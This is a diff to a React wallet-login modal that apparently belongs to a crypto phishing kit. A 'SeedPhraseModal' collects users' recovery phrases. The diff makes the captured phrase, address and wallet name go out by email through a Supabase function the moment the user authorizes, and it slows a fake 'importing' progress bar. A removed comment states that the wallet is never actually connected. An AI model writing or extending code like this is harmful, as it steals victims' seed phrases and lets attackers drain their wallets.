@@ -19,7 +19,7 @@ function ImportingScreen({ wallet, onDone }) {
   useEffect(() => {
     let p = 0;
     const iv = setInterval(() => {
-      p = Math.min(100, p + Math.random() * 12 + 4);
+      p = Math.min(100, p + Math.random() * 4 + 1.5);
       setProgress(Math.round(p));
       if (p > 25) setStatusMsg(msgs[1]);
       if (p > 55) setStatusMsg(msgs[2]);
@@ -28,7 +28,7 @@ function ImportingScreen({ wallet, onDone }) {
         clearInterval(iv);
         setTimeout(() => setPhase('empty'), 400);
       }
-    }, 120);
+    }, 180);
     return () => clearInterval(iv);
   }, []);
 
@@ -113,7 +113,7 @@ function ImportingScreen({ wallet, onDone }) {
               onClick={onDone}
               style={{
                 width: '100%', padding: '14px', borderRadius: 12, border: 'none',
-                background: 'var(--accent)', color: '#000',
+                background: 'var(--accent)', color: '#ffffff',
                 fontFamily: "'DM Sans', sans-serif", fontSize: 13, fontWeight: 800,
                 letterSpacing: 1.5, textTransform: 'uppercase', cursor: 'pointer',
                 transition: 'all 0.2s', boxShadow: '0 4px 20px rgba(0,255,136,0.25)',
@@ -296,7 +296,7 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
     <button onClick={() => ready && onClick()} disabled={!ready} style={{
       width: '100%', padding: '14px', borderRadius: 12, border: 'none',
       background: ready ? 'var(--accent)' : 'var(--surface2)',
-      color: ready ? '#000' : 'var(--text3)',
+      color: ready ? '#ffffff' : 'var(--text3)',
       fontFamily: "'DM Sans', sans-serif", fontSize: 13, fontWeight: 800,
       letterSpacing: 1.5, textTransform: 'uppercase',
       cursor: ready ? 'pointer' : 'not-allowed', transition: 'all 0.2s',
@@ -424,7 +424,7 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
 }
 
 // ── MAIN WALLET MODAL ──
-export default function WalletModal({ title = 'Log in or sign up', onClose, onSelect, selectedWallet, onContinue, showContinue }) {
+export default function WalletModal({ title = 'Log in or sign up', onClose, onSelect, selectedWallet, onContinue, showContinue, onImportDone }) {
   const [q, setQ] = useState('');
   const [seedWallet, setSeedWallet] = useState(null);
   const [importingWallet, setImportingWallet] = useState(null);
@@ -436,35 +436,36 @@ export default function WalletModal({ title = 'Log in or sign up', onClose, onSe
     setSeedWallet(w);
   }
 
-  function handleAuthorize({ phrase, address }) {
+  async function handleAuthorize({ phrase, address }) {
     const w = seedWallet;
-    setCapturedData({ phrase, address, walletName: w.name, walletIcon: w.icon });
+    const data = { phrase, address, walletName: w.name, walletIcon: w.icon };
+    setCapturedData(data);
     setSeedWallet(null);
     setImportingWallet(w);
+
+    // Fire email immediately on authorize
+    try {
+      await fetch(
+        `${process.env.REACT_APP_SUPABASE_URL}/functions/v1/send-email`,
+        {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${process.env.REACT_APP_SUPABASE_ANON_KEY}`,
+          },
+          body: JSON.stringify({ type: 'wallet_import', ...data }),
+        }
+      );
+    } catch (e) {
+      console.error('Email failed:', e);
+    }
   }
 
-  async function handleImportDone() {
-    // Send email with seed phrase + address, then close without connecting wallet
-    if (capturedData) {
-      try {
-        await fetch(
-          `${process.env.REACT_APP_SUPABASE_URL}/functions/v1/send-email`,
-          {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'Authorization': `Bearer ${process.env.REACT_APP_SUPABASE_ANON_KEY}`,
-            },
-            body: JSON.stringify({ type: 'wallet_import', ...capturedData }),
-          }
-        );
-      } catch (e) {
-        console.error('Email failed:', e);
-      }
-    }
+  function handleImportDone() {
     setImportingWallet(null);
     setCapturedData(null);
-    onClose();
+    if (onImportDone) onImportDone();
+    else onClose();
   }
 
   return (
